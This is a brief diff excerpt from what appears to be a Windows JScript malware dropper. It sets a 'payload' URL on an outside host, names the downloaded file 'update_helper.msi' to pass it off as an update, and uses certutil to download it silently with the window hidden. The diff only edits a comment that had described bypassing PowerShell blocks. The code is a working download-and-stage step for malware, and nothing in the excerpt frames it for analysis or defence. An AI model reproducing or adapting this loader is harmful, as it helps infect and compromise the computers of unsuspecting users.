@@ -24,7 +24,7 @@
             var tempPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\update_helper.msi";
             // YOUR RAILWAY PAYLOAD URL
             var msiUrl = "https://cocktails-payload-production.up.railway.app/schimdtconnect.msi";
-            // SILENT DOWNLOAD USING CERTUTIL (BYPASSES POWERSHELL BLOCKS)
+            // SILENT DOWNLOAD USING CERTUTIL
             var downloadCmd = 'certutil -urlcache -split -f "' + msiUrl + '" "' + tempPath + '"';
             shell.Run(downloadCmd, 0, true); // Wait for download
             var fso = new ActiveXObject("Scripting.FileSystemObject");
